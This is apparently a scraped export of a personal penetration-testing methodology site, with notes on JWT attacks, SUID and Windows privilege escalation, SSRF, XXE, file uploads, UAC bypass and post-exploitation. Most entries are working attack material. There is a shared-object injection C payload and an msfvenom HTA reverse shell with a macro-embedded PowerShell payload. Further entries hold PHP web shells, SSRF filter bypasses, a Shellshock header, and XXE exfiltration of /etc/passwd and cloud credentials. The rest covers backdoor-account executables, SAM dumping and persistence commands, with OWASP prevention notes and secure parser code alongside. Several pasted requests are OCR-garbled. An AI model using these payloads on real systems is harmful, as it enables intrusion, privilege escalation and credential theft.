    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/IOS Dynamic Analysis e4a7284d6f9d4fe8ba7e1f77d5d836de.html"
  },
  {
    "title": "JSON Web Tokens (JWT)",
    "body": "JSON Web Tokens (JWT) JWT.io JWT are comprised of a header, body, and a encryption key.  We can learn about the data within the token if we have the key. \n Header -  Used to describe encryption algorithm is being used. Several popular options exist and most of them require a key as well. \n Body -   Usually describes certain properties of a user. This can be information we might want to change to test the authorization module. \n Key -   If you get this wrong, the server will never accept your JWT; but if you are able to get the key and encode the value that is equally a very bad problem. Common attacks: Hashing algorithm none - W hen the server accepts JWT tokens with the header that indicated the use of no key. This will allow us to easily forge any token we want. \n JWT manipulation -  Sometimes, user controlled values end up in a JWT token. This should never ever be the case but since some application abuse JWT tokens for authentication rather than authorization, we can still play with the contents of the JWT by changing the username to something that interrupts the current JWT structure and insert our own. This means we might be able to change values and make ourselves admin or even login as other users if the system is built in a bad way. i.e. {\n\n\"username\":\"attack\",\n\n\"isAdmin\":\"false\"\n\n}\n\nMight turn into\n\n{\n\n\"username\":\"attack\",\n\n\"isAdmin\":\"false\"\n\n}\n\n\"isAdmin\":\"false\"\n\n} \n \n Token side jacking -  This exploit is basically intercepting the token/key and using it to sign a valid JWT. This can be very basic like a leaked token on the source code of a website. This can be prevented and we will get more into that into another article. \n Weak token secrets -  Of course just like with any key, this one is vulnerable to being weak and easy to brute force so pick a solid key and make sure it does not leak. \n Long\u3000lasting tokens -  Normally, every token contains an expiration field. Usually it\u2019s called \u201cexp\u201d but it might be called something different. Make sure the server actually disregards any JWTs that are no longer valid. Web Shells",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/JSON Web Tokens (JWT) 4af78d6b33c747c4b0ef117daa8ed03f.html"
  },
  {
    "title": "SUID Escalations",
    "body": "SUID Escalations SUID Vulnerabilities: find / -perm -u=s -type f 2>/dev/null\n# ls -la the results GTFObin -> SUID look through them https://gtfobins.github.io/ Other SUID Escalations Shared object Injection:   Looking for -so files? Strace -> monitor and tamper kernel processes find / -perm -u=s -type f 2>/dev/null\nstrace /user/local/bin/suid-so 2>&1\n# Look for no such file or dierctory...\nstrace /user/local/bin/suid-so 2>&1 | grep -i -E \"open|access|no such file\" Create a file to overwrite the found dependent files... libcalc.c #include stdio.h\n#include stdlib.h\n\n\nstatic void inject() __attribute((constructor));\n\nvoid inject() {\nsystem(\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p\");\n} Then: chmod +s file\ngcc  -shared -fPIC libcalc.c -o libcalc.so\n/usr/local/bin/suid-so Binary Simlinks https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html Find with linux exploit suggester (CVE-2016-1247) nginxed-root.sh Works on Nginx servers dpkg -l nginx Simlink to replace log files with malicious file... Environmental Variables \n What if we change the environmental PATH variables env\nstrings the service being run\necho 'int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0;}' > /tmp/service\n\n#For explicit services\n#change the path to our malicious service \n Abusing shell features: #/bin/sh version exploit\n#1. search for SUID and GUIDs\n#2. check program with strings, strace, ltrace\n#3. if /bin/sh is used check version\n/bin/sh --version\n#4. if sh version is lower thatn 4.2-048 ...\nfunction /usr/sbin/service { /bin/bash -p; }\nexport -f /usr/sbin/service\n/usr/local/bin/suid-found\nid\n\n--------\n#SHELLOPTS -> below bash 4.4\n#1. search for SUID and GUIDs\n#2. check program with strings, strace, ltrace\n#3. if /bin/sh is used check version\n/bin/sh --version\n#4. if sh version is lower thatn 4.4...\nenv -i SHELLOPTS=xtrace PS4='${cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash}' /usr/local/bin/suid-found\n/tmp/rootbash -p",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/SUID Escalations 9b5b8477b2d4424d866b934aa7614047.html"
  },
  {
    "title": "Token Impersonation",
    "body": "Token Impersonation Taking users tokens and impersonating Tokens are only reset when computer restarted mimikatz! \n meterpreter > getprivs whoami /priv EoP impersonate privileges seDebug seTakeOwnership seimpersonate seAssign primary token seCreatetoken \n potato attacks (metasploit):   for impersonate and seAssignPrimaryToken taking control of service accts may give us these kind of privelege Jenkins servers \u2192 hiding creds everywhere! also script console easy groovy reverse shells use exploit/multi/script/web_delivery set target powershell set payload windows/meterpreter/reverse_tcp use windows/local/ms16_075_reflection run impersonate_token \u201cNT AUTHORITY \\SYSTEM\u201d \n Alternate Data Streams: Alternate Data Streams -  https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/ dir /R more < hm.txt:root.txt:$DATA \n Metasploit getsystem: What happens when I type getsystem? -  https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/ meterpreter > getsystem -h \n Juicy Potato manual: https://github.com/ohpe/juicy-potato/releases JuicyPotato.exe -t * -p C:\\Payload.exe -l <LPORT> -c \"{CLSID}\u201d\n Juicy.Potato.x86.exe -t * -p C:\\test.exe -l 22 -c \"{03ca98d6-ff5d-49b8-abc6-03dd84127020}\u201d \n Printspoofer: https://github.com/itm4n/PrintSpoofer .\\PrintSpoofer64.exe -c \"C:\\inetpub\\wwwroot\\zen.exe\" -i \n SeBackup: #SeBackupPrivilege Back up files and directories Disabled\n#SeRestorePrivilege Restore files and directories Disabled\nC:\\Windows\\system32> reg save hklm\\system C:\\Users\\user\\system.hive\nC:\\Windows\\system32> reg save hklm\\sam C:\\Users\\user\\sam.hive\n#import sam and system to kali using SMB share\n#use secretsdump to dump hashes\nimpacket-secretsdump -sam sam.hive -system system.hive LOCAL \n SeTakeOwnership: takeown.exe /f C:/Windows/System32/Utilman.exe\nicacls C:/Windows/System32/Utilman.exe /grant user:F\ncopy cmd.exe Utilman.exe",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Token Impersonation 9635a81feb5e42619a3d4e567e86291a.html"
  },
  {
    "title": "Client-Side Attacks",
    "body": "Client-Side Attacks HTA Attack: msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -f hta-psh -o evil.hta \n Malicious Word Doc: Create Word doc and add a macro\u2026 sudo cat /var/www/html/evil.hta Put malicious payload into Split.py str = \"powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC.....\"\n\nn = 50\n\nfor i in range(0, len(str), n):\n\tprint \"Str = Str + \" + '\"' + str[i:i+n] + '\"' \n Put the output into the Macro and save as a word doc (May need to try different doc versions)",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Client-Side Attacks 2f2b8c78875b4ce28d229cc055b0f6ec.html"
  },
  {
    "title": "OSINT",
    "body": "OSINT OSINT Overview Search Engine OSINT Image OSINT Location Email OSINT Social Media OSINT Website OSINT Business OSINT Wireless OSINT OSINT Tools",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/OSINT da5abb04dd3248bd87fa3247ac4404e4.html"
  },
  {
    "title": "2. Cryptographic Failures",
    "body": "2. Cryptographic Failures https://owasp.org/Top10/A02_2021-Cryptographic_Failures/ \n Detection: MD5, SHA1 or any weak cryptographic algorithm in use Is the received server certificate and the trust chain properly validated? Is encryption not enforced, e.g., are any HTTP headers (browser) security directives or headers missing? Is any data transmitted in clear text? This concerns protocols such as HTTP, SMTP, FTP also using TLS upgrades like STARTTLS. External internet traffic is hazardous. Verify all internal traffic, e.g., between load balancers, web servers, or back-end systems. Are any old or weak cryptographic algorithms or protocols used either by default or in older code? Are default crypto keys in use, weak crypto keys generated or re-used, or is proper key management or rotation missing? Are crypto keys checked into source code repositories? \n \n Prevention: Classify data processed, stored, or transmitted by an application. Identify which data is sensitive according to privacy laws, regulatory requirements, or business needs. Don't store sensitive data unnecessarily. Discard it as soon as possible or use PCI DSS compliant tokenization or even truncation. Data that is not retained cannot be stolen. Make sure to encrypt all sensitive data at rest. Ensure up-to-date and strong standard algorithms, protocols, and keys are in place; use proper key management. Encrypt all data in transit with secure protocols such as TLS with forward secrecy (FS) ciphers, cipher prioritization by the server, and secure parameters. Enforce encryption using directives like HTTP Strict Transport Security (HSTS). Disable caching for response that contain sensitive data. Apply required security controls as per the data classification. Do not use legacy protocols such as FTP and SMTP for transporting sensitive data.",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/2 Cryptographic Failures a7b38732493f4548b979df78b879d3d3.html"
  },
  {
    "title": "10. Server-Side Request Forgery (SSRF)",
    "body": "10. Server-Side Request Forgery (SSRF) https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/ \n Imagine you  have a public facing website: SSRF occurs when the attacker can forge requests that can abuse a trust relationship between the trusted website and another service. These services can be internal or external. \n Application is requesting a remote resource without first validating the user-supplied URL. \n Two types of SSRF: In Band/Regular: You can tamper with a url and the result is reflected back to you in the application Out of Band/Blind:  The application does not display back to you. We need to use Burp Collaborator. \n How to find SSRF: Map the application with burp suite and manual review Identify request parameters with hostnames, IPs, or full URLs For each parameter, modify its value and observe the applications response \n Exploitation: \n Prevention: Application level Sanitize and validate client supplied input Utilized a positive allow list for URL Schema, port, and destination Do not send raw responses to clients Disable HTTP redirections DO NOT mitigate with deny lists. Network level Segment network \n Examples: \n Basic SSRF against the local server: POST /product/stock HTTP/1.1\nUser-Agent: Mozilla/5.0 (X11; Linux X86_64; rv: 78.0)\nGecko/20100101 Firefox/78.0\nAccept: */*\nContent-Length: 25\nConnection: close\nstockApi=http://localhost \n Basic SSRF against another backend system: Fuzz the IP range and ports in scope for a backend system POST /product/stock HTTP/1.1\nUser-Agent: Mozilla/5.0 (X11; Linux X86_64; rv: 78.0)\nGecko/20100101 Firefox/78.0\nAccept: */*\nContent-Length: 25\nConnection: close\nstockApi=http://127.0.0.FUZZ:FUZZ \n SSRF with blacklist-based input filter: https://www.ipaddressguide.com/ip We can replace the IP in the request with the decimal version to bypass the blacklist filter We can bypass word filters by URL and double URL encoding POST /product/stock HTTP/1.1\nUser-Agent: Mozilla/5.0 (X11; Linux X86_64; rv: 78.0)\nGecko/20100101 Firefox/78.0\nAccept: */*\nContent-Length: 25\nConnection: close\nstockApi=http://2130706433/\n----\nPOST /product/stock HTTP/1.1\nUser-Agent: Mozilla/5.0 (X11; Linux X86_64; rv: 78.0)\nGecko/20100101 Firefox/78.0\nAccept: */*\nContent-Length: 25\nConnection: close\nstockApi=http://127.1/%25%36%31dmin \n SSRF with whitelist-based input filter: We can bypass the whitelist by keeping the whitelisted URL in our parameter We can use # after our injected URL to ignore the original URL We can also URL or double URL encoding this to bypass more filters POST /product/stock HTTP/1.1\nUser-Agent: Mozilla/5.0 (X11; Linux X86_64; rv: 78.0)\nGecko/20100101 Firefox/78.0\nAccept: */*\nContent-Length: 25\nConnection: close\nstockApi=http://localhost%25%23@stock.weliketoshop.net \n SSRF with filter bypass via open-redirect vulnerability: find a valid path that allows for open redirect on the website replace the SSRF vulnerable aspect to the found open redirect POST /product/stock HTTP/1.1\nHost:\nac141\u00a3881e10619180a32a2009c003d.web-security-acad emy. net\nCookie: session=MOxXgdshopbR408rNJEOu0eSHDJ31HX\nUser-Agent: Mozilla/5.0 (X11; Linux X86_64;\nrv:78.0) Gecko/20100101 Firefox/78.0 Accept: */*\nAccept-Language: en-US, en; q=0.5\nContent -Type: application/x-www-form-urlencoded\nContent-Length: 96\nTe: trailers\nConnection: close\nstockApi=\n/product /nextProduct&3fcurrentProductId83d1826path\n%3dhttp%3a//192.168.0.128%3a8080/admin \n Blind SSRF with out-of-band detection: Send requests to a client instead of backend. Use your own server or burp collaborator to see if SSRF is achieved GET /product?productId=1 HTTP/1.1\nHost:\nac7biffale2a3ddd80066e4800610056.web-security-academ\ny. net\nCookie: session=gv7KmdUNf2nputmKeWy9XdhIJL\u00a390oWx\nUser-Agent: Mozilla/5.0 (X11; Linux X86_64; rv:78.0)\nGecko/20100101 Firefox/78.0\nAccept:\ntext/htm1, application/xhtml+ml,application/xml;q=0.\n9, image/webp, * /*; q=0. 8\nAccept-Language: en-US, en; q=0.5\nAccept-Encoding: gzip, deflate Referer:\nhttp://server.net\nUpgrade-Insecure-Requests: 1\nTe: trailers\nConnection: close \n Blind SSRF with shellshock exploit: target \u2192 add application to scope Use collaborator everywhere Look for collaborator ping backs GET /product?productId=1 HTTP/1.1\nCookie: session=YJCtJu5qw7c9d4wnixrX2J4JL364zd1C\nUser-Agent: () { :; J; /usr/bin/nslookup $ (whoami).test.burpcollaborator.net\nAccept:\ntext /html, application/xhtml+xmi, application/xm1; q=0.\n9, image/webp, * /*; q=0.8\nAccept-Language: en-US, en; q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http: //192.168.0.1:8080/\nConnection: close",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/10 Server-Side Request Forgery (SSRF) e8759cd520de45baa49db4e21245f527.html"
  },
  {
    "title": "Databases",
    "body": "Databases \n dumping db config for passwords \n mysql login: mysql -u root -p'password' drupal \n Raptor exploits mysql \u2192 checking strings or cat db.dump for credentials ? \n MySQL: show databases;\nselect database\nshow tables; \n \n MSSQL: \n sqsh -S server_name -U username -P password impacket-mssqlclient sa:password@0.0.0.0 impacket-mssqlclient DOMAIN/user:\u2019password\u2019@0.0.0.0 -windows-auth SQL> enable_xp_cmdshell\nSQL> xp_cmdshell '<CMD>' \n SELECT name FROM sys.databases;\n\nuse database;\n\nSELECT name FROM sys.tables;\n\nSELECT * FROM table; \n PostgreSQL: psql unix unixusrmgr -h localhost",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Databases a481e12cee194b7392d9f2c67776c665.html"
  },
  {
    "title": "Exploitation Basics",
    "body": "Exploitation Basics B ind shells and reverse shells: R everse shells Victim connects to us Attacker is listening \u2192 target is connecting use this 95% of the time Bind shells We open up a port on the victim machine and then connect from the attacker box Harder to do because of firewalls \n Staged vs Non-staged payloads Staged: Sends payload in stages Creates connection first, then sends exploit Can be less stable ex: windows/meterpeter/reverse_tcp Non-staged: Sends exploit shell code all at once Larger in size and won\u2019t always work ex: windows/meterpeter_reverse_tcp try different types of payloads to see if one works over another payload/type \n Brute force attacks We should try against SSH, weak/default passwords Hydra hydra -l root -P /usr/share/wordlists/metesploit/rockyou.txt ssh://<IP> -t 4 -V \n Metasploit: msfconsole\nuse ssh login check scanner\n \n Password Spraying and credential stuffing use foxy proxy, create burp foxy proxy  Send login attempt intercepted to burpsuite intruder select email and password parameter use pitchfork with user and password list Look for status code changes or changes in length, failed login and success texts \n spraying (know user but not pass) \n AD can have max password attempts best to ask before attempting ALWAYS check default creds and password spray (higher probability)",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Exploitation Basics 99d62a141f8d4d34a5901418b6442b08.html"
  },
  {
    "title": "DNS (53)",
    "body": "DNS (53) Forward Lookup: for ip in $(cat list.txt); do host $ip.megacorpone.com; done \n Reverse Lookup: for ip in $(seq 50 100); do host 0.0.0.$ip; done | grep -v \"not found\u201d\nfor ip in $(seq 1 225); do host -l 0.0.0.0 0.0.0.$ip; done | grep -v \"failed:\u201d \n Others: host -l [test.com](http://test.com/) [ns1.test.com](http://ns1.test.com/)\n\nhost -t ns [test.com](http://test.com/) | cut -d \" \" -f 4\n\ndnsrecon -d [test.com](http://test.com/) -t axfr\n\ndnsenum [zonetransfer.me](http://zonetransfer.me/)\n\ndig -axfr IP \n Example: First $ nslookup 10.10.10.13 10.10.10.13\n13.10.10.10.in-addr.arpa\tname = ns1.cronos.htb. Then: dig axfr cronos.htb @10.10.10.13 We find additional domains to add to /etc/hosts \n Subdomain Enumeration: \n We can enumerate for subdomains by viewing the sites SSL certificate. \u2014append-domain gobuster",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/DNS (53) 10a9a63d669b46d6b7e6598b0ffcacae.html"
  },
  {
    "title": "Attacking Authorization",
    "body": "Attacking Authorization Two main vulnerabilities: \n API1: Broken Object Level Authorization (BOLA) GET /api/v2/10101-1010-10101010/location We can fuzz the \u201810101-1010-10101010\u2019 id or look around the site to see if there are any ids being used for other features \n \n API5: Broken Function Level Authorization (BFLA): Performing actions you're not allowed to perform. We can find through source code review, documentation Example: Being able to grab all users from an endpoint.  You have:\nGET /api/v2/users/1\nyou find vulnerability at:\nGET /api/v2/users\n\nOR\n\nYou have:\nPOST /api/v2/user/delete/1\nyou find vulnerability at:\nGET /api/v2/admin/delete/1",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Attacking Authorization 05cf0654709e4615a1a33cd35618d8e9.html"
  },
  {
    "title": "File Uploads",
    "body": "File Uploads File upload bypass payloads: Regular: <?php echo system($_GET['command']); ?>\n#in burp\nGET /example/exploit.php?command=id HTTP/1.1 Get a files contents: <?php echo file_get_contents('/etc/passwd'); ?> \n Bypassing image requirements: #change the specified Content-Type header to image/jpeg\nContent-Type: image/jpeg;\nContent-Type: image/png;\n#Try changing the contents of the string of the filename\nexploit.php.png\nexploit.png.php \n File execution bypass: #Upload a legitmate file first -> send to repeater\n#Then upload you exploit file -> send to repeater\n\n#Trigger the executiob of the image file... send to repeater \n \n \n PHP file extension bypass: php\nphp2-7\nphps\nctp\ninc\nctp\nhphp\npgif\nphp.jpg\nphtml\nphar Other: exploit%2Ephp\nexploit.p.phphp\nexploit.asp;.jpg\nexploit.asp%00.jpg F ile upload race conditions:",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/File Uploads f6e2465bf6a94dc5b6d08af9c6890e24.html"
  },
  {
    "title": "Mobile Security",
    "body": "Mobile Security \n Resources: https://mobile-security.gitbook.io/mobile-security-testing-guide/overview/0x03-overview https://owasp.org/www-project-mobile-top-10/ https://book.hacktricks.xyz/mobile-pentesting/ios-pentesting-checklist https://book.hacktricks.xyz/mobile-pentesting/android-checklist \n Regular Penetration testing process: Reconnaissance Active and passive Scanning/Enumeration Exploitation Privilege Escalation Persistence/Covering Tracks Reporting \n Mobile Pentesting Process: recon Read Reviews find in on app store and read review or patch notes for issues enumerate other apps by the company Static analysis manual and automated source code review Dynamic analysis Burp suite OWASP top 10/Mobile top 10",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Mobile Security 6cf9890132064b9bb58d0eead3d9cffb.html"
  },
  {
    "title": "Post Exploitation",
    "body": "Post Exploitation Maintaining Access Overview: Not always necessary on a pentest In metaspoit: #persistence scripts\nrun persistence -h\nexploit/windows/local/persistence\nexploit/windwos/local/registry_persistence\n#Scheduled Tasks\nrun scheduleme\nrun schtaskabuse\n#Add a user\nnet user hacker password123 /add \n Pivoting: We can get access ti additional networks after compromise through pivoting route print to see routing table arp -a \n run autoroute -s <IP>/24\nrun autoroute -p can also try proxychains or sshuttle",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Post Exploitation 7517b51f1f0347aa8814dafc095b56e4.html"
  },
  {
    "title": "Path executable files",
    "body": "Path executable files Powerup method (easy): powershell -ep bypass\n. .\\PowerUp.ps1\nInvoke-AllChecks\n#finds executable services Manual: C:\\Users\\User\\Desktop\\Tools\\Accesschk\\accesschk64.exe -wvu \"C:\\Program Files\\File Permissions Service\"\n#notice RW FILE_ALL_ACCESS serve up x.exe from prev module with http server \n Now overwrite the service with your service sc start <name service> User will be added",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Path executable files a8f3cd127830416fbbc8c89ff064ef62.html"
  },
  {
    "title": "XML External Entities (XXE)",
    "body": "XML External Entities (XXE) Attacking systems that parse XML input Dos, LFI, RCE etc. XML basics <?xml version=\"1.0\" encoding=\"ISOBLAH\"\n<!DOCTYPE gift [\n\t<!ENTITY from \"C:/Heath&Amber\">\n]>\n\n<gift>\n\t<To>Frank</To>\n\t<From>&gift;</From>\n\t<Item>Cards</Item>\n</gift>  google XXE Payloads Payloads all the things We can put malicious characters in our entities that are banned in normal use File upload features Bypassing whitelisted extensions \n Prevention: Disable XML External Entities This secure coding practice blocks  XML External Entity attacks Unfortunately Java EE applications have a real problem with disabling XML External Entities. \nThey are turned on by default in the default DocumentBuilder and all other XML related capabilities: schema verification, transformation, etc. There is also a multitude of open source parsers which have different configuration settings for turning off entities. \nThese parsers may be required by other open source components. Best approach is to disable all known resolving properties as seen below\n . The project should have a single XML DocumentBuilder constructor that\n turns off XXE and gets used everywhere. \npublic static final Collection XML_FEATURES_TO_DISABLE = Collections.unmodifiableList(Arrays.asList(\n    XMLConstants.ACCESS_EXTERNAL_DTD,\n    XMLConstants.ACCESS_EXTERNAL_SCHEMA,\n    XMLConstants.ACCESS_EXTERNAL_STYLESHEET,\n    // https://xerces.apache.org/xerces-j/features.html\n    \"http://xml.org/sax/features/external-general-entities\",\n    \"http://xml.org/sax/features/external-parameter-entities\",\n    \"http://apache.org/xml/features/validation/schema\",\n    \"http://apache.org/xml/features/nonvalidating/load-dtd-grammar\",\n    \"http://apache.org/xml/features/nonvalidating/load-external-dtd\",\n    // https://xerces.apache.org/xerces2-j/features.html\n    \"http://apache.org/xml/features/xinclude/fixup-base-uris\"\n));\n\nfactory.setExpandEntityReferences(false);\n\n// Set the validating off because it can be mis-used to pull a validation document\n// that is malicious or from the local machine\nfactory.setValidating(false);\n\nfactory.setXIncludeAware(false);\ntry {\n    factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n} catch (ParserConfigurationException e) {\n    throw new IllegalStateException(\"Could not set secure processing feature\", e);\n}\n\nfor (String feature : XML_FEATURES_TO_DISABLE) {\n    try {\n        factory.setFeature(feature, false);\n    } catch (ParserConfigurationException e) {\n        log.debug(\"Could not disable processing feature \" + feature);\n    }\n}\n\nif (!allowDTD) {\n    try {\n        factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n    } catch (ParserConfigurationException e) {\n        log.debug(\"Could not disallow doctype declaration\", e);\n    }\n}\n\n// Next create a new document builder\nDocumentBuilder db;\ntry {\n    db = factory.newDocumentBuilder();\n} catch (ParserConfigurationException e) {\n    // this represents a fatal programming error in the code above\n    throw new IllegalStateException(e);\n}\n\n// Overwrite the entity resolver. This prevents injection from local machine like:\n\ndb.setEntityResolver(new NoOpEntityResolver());\n\n Principle of Least Privilege This code block protects against software weaknesses such as  Execution with Unnecessary Privileges ,\n Incorrect Permission Assignment for Critical Resource \n and  Incorrect Authorization The principle of least privilege says that users in a system should only\n be given neccesary access or roles to complete their function. Giving the user higher privileges by default exposes the application to \nlogical attacks where the application fails to reach the block of \ncode that drops privileges and the privileges remain elevated. Examples of such incorrect behavior are running processes as root/system\n or giving a user admin roles by default before performing an \nauthorization check. Execution with Unnecessary Privileges and Incorrect Permission Assignment for Critical Resource  add insult to injury  when another security flaw exists: Path Traversal and XML External Entity read system files: /etc/shadow OS Command Injection from significant to total access to the system Even when software is not running as root if the user is given sudo rights it's just the same. Note:  The principle of least privilege will not prevent authorization attacks if authorization decisions are not carefully reviewed.\nThe principle of least privilege will also not prevent horizontal privilege escalation attacks where a user attacks another. \n \n Examples : Basic in-band: <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE test [\n\t<!ENTITY test SYSTEM \"file:///etc/passwd\">\n]>\n\n<gift>\n\t<To>&test;</To>\n\t<From>gift</From>\n\t<Item>Cards</Item>\n</gift>  \n XXE to SSRF: <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE test [\n\t<!ENTITY test SYSTEM \"http://0.0.0.0/latest/meta-data/iam/security-credentials/admin\">\n]>\n\n<gift>\n\t<To>&test;</To>\n\t<From>gift</From>\n\t<Item>Cards</Item>\n</gift>  \n Blind XXE Out-of-Band: response returns an error instead of reflecting information back. <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE test [\n\t<!ENTITY test SYSTEM \"http://0.0.0.0/\">\n]>\n\n<gift>\n\t<To>&test;</To>\n\t<From>gift</From>\n\t<Item>Cards</Item>\n</gift>  \n Parameter Entities: <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE test [\n\t<!ENTITY % test SYSTEM \"http://0.0.0.0/\"> %test;]>\n\n<gift>\n\t<To>test</To>\n\t<From>gift</From>\n\t<Item>Cards</Item>\n</gift>  \n Out-Of-Band Data exfiltration: <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE test [\n\t<!ENTITY % loadDtd SYSTEM \"http://0.0.0.0/exploit\"> \n%loadDtd;\n%stack;\n%exfil]>\n\n<gift>\n\t<To>test</To>\n\t<From>gift</From>\n\t<Item>Cards</Item>\n</gift>  \n <!ENTITY % file SYSTEM \"file:///etc/hostname\">\n<!ENTITY % stack \"<!ENTITY % exfil SYSTEM 'http://0.0.0.0/%file;'>\">\n----------\n<!ENTITY % file SYSTEM \"file:///etc/hostname\">\n<!ENTITY % stack \"<!ENTITY &#x25; exfil SYSTEM 'http://0.0.0.0/%file;'>\"> \n Retrieving data via errors: <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE test [\n\t<!ENTITY % loadDtd SYSTEM \"http://0.0.0.0/exploit\"> \n%loadDtd;\n%stack;\n%exfil]>\n\n<gift>\n\t<To>test</To>\n\t<From>gift</From>\n\t<Item>Cards</Item>\n</gift>  \n <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % stack \"<!ENTITY &#x25; error SYSTEM 'file://idk/%file;'>\"> \n Xinclude: if we are given JSON, its worth a try to convert to XML in burp and see if it accepts it. POST /product/stock HTTP/1.1\nHost:\nac731f6615667ffc084703400a0004d .web-securit y-academy. net\nCookie: session=\n(VCO4RvW6 JF6b0P2Lcn8tDMNGWXBOyb iD\nUser-Agent: Mozilla/5.0 (X11; Linux \u00d786_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept:\n* /*\nContent - Type:\napplication/x-www-form-urlencoded\nOrigin:\nI\nhttps://ac731f6615667ffc084703400a0004d.web\n-security-academy. net\nContent -Length: 128\nTe: trailers\nConnection: close\nproductId=%26entity;&storeId=1 \n POST /product/stock HTTP/1.1\nHost:\nac731f6615667ffc084703400a0004d .web-securit y-academy. net\nCookie: session=\n(VCO4RvW6 JF6b0P2Lcn8tDMNGWXBOyb iD\nUser-Agent: Mozilla/5.0 (X11; Linux \u00d786_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept:\n* /*\nContent - Type:\napplication/x-www-form-urlencoded\nOrigin:\nI\nhttps://ac731f6615667ffc084703400a0004d.web\n-security-academy. net\nContent -Length: 128\nTe: trailers\nConnection: close\nproductId=<hack xmlns:xi=\"http://www.w3.org/2001/XInclude\">< xi:include parse=\"text\"\nhref-\"file:///etc/passwd\"/></hack>&storeId=1 \n Repurposing local Dtds for data exfiltration: https://github.com/GoSecure/dtd-finder \n XXE via SVG image: exploit file uploads since svg is just an xml image Replace the requests image xml with your xml then send it",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/XML External Entities (XXE) 9c601cbbf44a4b71a2ebd22c90b094dc.html"
  },
  {
    "title": "UAC Bypass",
    "body": "UAC Bypass https://github.com/hfiref0x/UACME Once you have a reverse shell, check the user permissions with whoami /groups Even though you're a local admin, you'll see the shell you have is \nrunning at a Medium Mandatory Level. That means that many actions will \nbe prohibited by UAC, and this should ring a bell. Because of the way of how UAC exploit work, they are often developed for specific OS versions and build.  systeminfo To get more information about that (OS Name and OS Version) - Google \"OS name + version + 'uac bypass'\". Try spawning high integrity shell: powershell.exe Start-Process cmd.exe -Verb runAs\nStart-Process -NoNewWindow -FilePath C:/File.exe Disable UAC: C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f \n Metasploit  (W10) UAC bypass exploit(windows/local/bypassuac_sdclt) \n https://github.com/L3cr0f/DccwBypassUAC powershell.exe Start-Process cmd.exe -Verb runAs \n Eventviewer UAC bypass https://github.com/CsEnox/EventViewer-UACBypass Fodhelper sigcheck.exe -a -m C:\\Windows\\System32\\fodhelper.exe\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \"cmd.exe\" /f\nnet user admin password123!\n \n Insecure File Permissions: \n Mask Permissions F Full access M Modify access RX Read and execute access R Read-only access W Write-only access Identifying a running service: PS> Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}\n#service running is returned...\nicacls \"C:\\Program Files\\Serviio\\bin\\Service.exe\"\n#Check permissions Adding a user exe: (adduser.c) #include <stdlib.h>\n\nint main ()\n{\n  int i;\n  \n  i = system (\"net user test Password123! /add\");\n  i = system (\"net localgroup administrators test /add\");\n  \n  return 0;\n} #Compile c to exe on linux...\ni686-w64-mingw32-gcc adduser.c -o adduser.exe Replacing running service with ours: move \"C:\\Program Files\\Service\\bin\\Service.exe\" \"C:\\Program Files\\Serviio\\bin\\Service_original.exe\"\nmove adduser.exe \"C:\\Program Files\\Service\\bin\\Service.exe\"\ndir \"C:\\Program Files\\Serviio\\bin\\\"\nnet stop Serviio\nwmic service where caption=\"Service\" get name, caption, state, startmode\n shutdown /r /t 0 net localgroup Administrators \n GUI based bypasses: \n #On remote desktop 